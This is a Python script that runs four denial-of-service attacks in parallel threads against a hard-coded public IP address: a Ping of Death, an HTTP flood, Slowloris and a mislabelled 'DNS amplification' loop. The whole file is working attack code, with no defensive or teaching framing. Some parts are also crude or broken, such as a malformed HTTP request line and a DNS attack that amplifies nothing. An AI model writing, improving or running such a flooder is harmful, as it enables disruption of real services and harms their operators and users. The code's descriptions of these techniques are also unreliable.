import socket
import threading
import time
import random
import string
import scapy
from scapy.all import *

# Target IP and port
target_ip = "54.159.179.237"
http_port = 80
dns_port = 53

# Ping of Death
def ping_of_death():
    while True:
        ip = IP(dst=target_ip)
        icmp = ICMP()
        raw = Raw(b'X'*65500)
        packet = ip / icmp / raw
        send(fragment(packet), verbose=0)
        time.sleep(1)

# HTTP Flood
def http_flood():
    while True:
        http_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            http_conn.connect((target_ip, http_port))
            data = (f"GET HTTP/1.1\nHost: {str(target_ip)}\n\n").encode()
            http_conn.send(data)
        except socket.error:
            print("No connection")
        finally:
            http_conn.shutdown(socket.SHUT_RDWR)
            http_conn.close()
        time.sleep(1)

# Slowloris
def slowloris():
    while True:
        http_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            http_conn.connect((target_ip, http_port))
            data = (f"GET HTTP/1.1\nHost: {str(target_ip)}\r\n").encode()
            http_conn.send(data)
            for i in range(9999):
                data = random.choice(string.ascii_letters + string.digits)
                data = "X-{}: {}\r\n".format(i, data).encode()
                http_conn.send(data)
                time.sleep(random.uniform(0.1, 3))
            http_conn.close()
        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            continue
        time.sleep(1)

# DNS Amplification
def dns_amplification():
    while True:
        dns_conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            dns_conn.sendto(b"DNS request", (target_ip, dns_port))
        except socket.error:
            print("No connection")
        finally:
            dns_conn.close()
        time.sleep(1)

# Create threads for each attack
threads = []
threads.append(threading.Thread(target=ping_of_death))
threads.append(threading.Thread(target=http_flood))
threads.append(threading.Thread(target=slowloris))
threads.append(threading.Thread(target=dns_amplification))

# Start threads
for t in threads:
    t.start()

# Run indefinitely
while True:
    pass
